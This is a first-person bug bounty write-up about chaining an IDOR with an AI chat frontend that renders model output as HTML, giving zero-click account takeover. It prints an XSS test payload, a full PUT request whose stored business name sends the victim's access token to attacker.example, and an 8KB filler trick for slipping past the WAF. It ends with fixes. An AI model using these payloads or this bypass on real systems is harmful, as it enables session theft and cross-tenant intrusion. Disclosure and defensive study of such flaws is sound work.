I want to tell you about the moment I realized I could make a company's own AI
assistant steal its users' session tokens — without the victim ever clicking
anything, without any phishing link, without any social engineering. Just a
normal user opening the chat they use every day.

This is the story of how I chained a forgotten IDOR and a blind trust in LLM
output into a full cross-tenant Account Takeover. Severity: Critical. Impact:
every user on the platform.


IT STARTED WITH THE CHATBOT
----------------------------

The target was an AI-powered business management dashboard — the kind of SaaS
that's eating every vertical right now. Property management, calendars, financials,
all wrapped in a conversational interface. You ask the AI about your business, it
answers. Clean product, well-funded company.

My first instinct when I see an AI feature in a bug bounty scope is always the
same: what does the frontend do with the model's response? Most of the time the
answer is boring — it just renders Markdown. But sometimes developers get creative.
And creative is dangerous.

I pulled up DevTools, opened the chat, and started sending messages while watching
the DOM mutate in real time. After a few minutes I noticed something strange.

The LLM's responses weren't just Markdown. They contained tokens like this:

    :iframe[]{srcdoc='...'}
    :button[Click here]{action='...'}

Custom syntax. The kind that only makes sense if the frontend is actively parsing
it into something. I opened the JavaScript bundle and searched for that colon
prefix. Found it fast: a DSL renderer, sitting right on the output stream, that
converts those tokens into real HTML nodes and injects them into the DOM.

My first thought: that is a dangerously powerful primitive to apply to untrusted
text.

My second thought: is LLM output considered untrusted here?

Spoiler: it was not.


CONFIRMING THE SINK
-------------------

To test whether I could make the model echo a colon-DSL payload, I sent a crafted
message to the chat endpoint. I asked the model to return a specific string
verbatim — no code blocks, no backticks, just the raw text. Backticks matter here:
if the model wraps the payload in a code block, the DSL renderer may skip it.

I kept the payload simple for the initial confirmation:

    :iframe[]{srcdoc='<svg onload=alert(1)>'}

I hit send. The stream came back. The frontend parsed it. An iframe materialized
in the DOM. The SVG onload fired. alert(1).

XSS confirmed. Stored? Not yet — this was a reflected payload via the prompt
parameter. Interesting, but limited. An attacker would need to trick a victim into
sending that specific prompt. That is not zero-click.

I needed a way to get the payload into the victim's session without them ever
typing anything malicious.


THE IDOR THAT CHANGED EVERYTHING
---------------------------------

While I was probing the chat endpoints, I was also running a parallel recon pass
on the API surface. One endpoint caught my attention:

    PUT /properties/{id}

The request body let you update a business record — name, price, metadata. The
ID in the URL was a plain sequential integer. I was logged in as Account A with
property ID 4148. Out of habit, I swapped the ID to 4149 — a property that
belonged to a completely different tenant — and sent the request.

200 OK.

No ownership check. No tenant validation. The server updated the other business's
record using my Bearer token. A textbook IDOR.

Individually, both findings were already reportable. The XSS was a P2 at best
without a reliable delivery mechanism. The IDOR was a solid P2, maybe P1 depending
on the program.

But together?

Together they were something entirely different.


THE CHAIN: FROM IDOR TO ZERO-CLICK ATO
---------------------------------------

Here's what I realized: the AI assistant is designed to answer questions about
your business. When you ask "show me details about my property" or "what's on
the calendar for this business?", the model reaches into the data layer, retrieves
your business name, and includes it in its answer.

The business name is stored. I can write it. The model will read it and echo it
back. The frontend will render whatever the model says.

So: what happens if I write the colon-DSL XSS payload into the victim's business
name?

The answer was obvious and terrifying. Let me walk through it step by step.

Step 1 — I enumerated property IDs to identify a target victim. Sequential
integers, trivial to iterate.

Step 2 — I crafted a PUT request to the victim's property endpoint with two
key elements: an ~8KB filler field to bypass the WAF (more on that in a moment),
and the business name set to a colon-DSL payload that exfiltrates the session
token:

    PUT /properties/4149 HTTP/1.1
    Host: deal-room-gw.redacted.com
    Authorization: Bearer <my_token>
    Content-Type: application/json

    {
      "a": "aaaaaaa...8KB...aaaaaaa",
      "name": ":iframe[]{srcdoc='<svg onload=\"new Image().src=\\'https://attacker.example/t?tok=\\'+encodeURIComponent(localStorage.getItem(\\'access_token\\'))\">'}",
      "asking_price": 1111,
      "year_built": 1990,
      "multifamily_data": {"units": 1}
    }

The server stored the payload as the victim's business name. No alerts. No flags.

Step 3 — I switched to the victim account and opened the AI chat.

I typed: "Show me the calendar for this business."

The model responded with a helpful summary — and embedded the business name in
the middle of its answer. The frontend hit the colon-DSL renderer. The iframe
was constructed. The SVG onload fired. My server logged:

    GET /t?tok=eyJhbGci...

The victim's access token. Valid for 30 days. In my hands.

The victim had done nothing suspicious. They opened the chat and asked a normal
question. That was it.


A NOTE ON THE WAF BYPASS
-------------------------

One detail worth highlighting: both the /files/chat endpoint and /properties
required an ~8KB JSON filler field (I used key "a" with repeated characters) to
consistently bypass the WAF and hit the vulnerable code path.

This is not a clever bypass — it is a volume bypass. The WAF's pattern matching
apparently does not handle oversized payloads well, or the large field causes the
request to skip inspection. The deeper point is that the WAF was the only
mitigation layer standing between attacker-controlled input and the application.
Once the WAF fell, there was nothing left.

Never let your WAF be your last line of defense.


IMPACT
------

Let me be direct about what this meant for every user on the platform:

    - Any attacker with a free account could compromise any other user's account.
    - No phishing. No social engineering. No malware.
    - The victim's 30-day session token ends up in the attacker's server logs.
    - With that token: read sensitive business data, impersonate the victim,
      pivot to other tenants, persist for a month.
    - Complete isolation between customers? Gone.

This is not a theoretical risk. I had a working proof of concept that I confirmed
end-to-end. The only reason I didn't go further is because that's not what
responsible disclosure looks like.


WHAT MADE THIS VULNERABILITY INTERESTING
-----------------------------------------

Security researchers spend a lot of time thinking about prompt injection — the
idea of manipulating an LLM's behavior through malicious instructions embedded
in user input. This isn't that.

The LLM was not compromised. It was not tricked. It did exactly what it was
designed to do: retrieve the business name from the database and include it in
its answer. The LLM was innocent.

The vulnerability lives entirely in the gap between two assumptions:

1. The developer who built the colon-DSL renderer assumed the LLM's output was
   safe to transform into HTML.

2. The developer who built the properties API assumed that a valid Bearer token
   meant the user owned the resource.

Neither assumption was validated. And the gap between them was a zero-click
critical.


HOW TO FIX IT
-------------

The remediation is not subtle.

On the frontend side:
  - Treat LLM output like user input. It is. The LLM reads from user-controlled
    data stores; its output is a vector for whatever is in those stores.
  - Never apply HTML-generating transformations to untrusted text without
    sanitization. DOMPurify in strict mode, minimal allowlists, no event
    handlers, no srcdoc, no SVG scripting.
  - Deploy a Content Security Policy that blocks inline scripts. This won't fix
    the IDOR, but it raises the bar for every future XSS in the chain.
  - Don't store access tokens in localStorage. HttpOnly cookies with short TTLs
    are the right call for session material.

On the API side:
  - Add an ownership check to every resource-mutating endpoint. The server must
    compare the resource's tenant against the tenant in the JWT before accepting
    any write. Full stop.
  - Replace sequential integer IDs with UUIDs. It doesn't prevent IDOR on its
    own, but it raises the bar for discovery significantly.

On the architecture side:
  - Your WAF is not an application-layer defense. Fix the underlying issues; let
    the WAF be a detection signal, not a gate.

FINAL THOUGHTS
--------------

Every bug bounty hunter talks about "chaining vulnerabilities." What that phrase
often obscures is the moment of insight — the instant where two unrelated,
medium-severity findings click into place and reveal a critical underneath.

For me, that moment was realizing that the LLM was essentially a relay. A relay
that would faithfully carry attacker-controlled data from the database (via the
IDOR) into the rendering pipeline (via the colon-DSL renderer), with no awareness
that it was doing anything wrong. The model was just doing its job.

The lesson for developers: as soon as your frontend renders LLM output as anything
other than text, you have a new class of XSS sink. Treat it accordingly.

The lesson for hunters: AI features are not magic boxes. They read from somewhere
and they render somewhere. Follow the data.

Happy hacking.
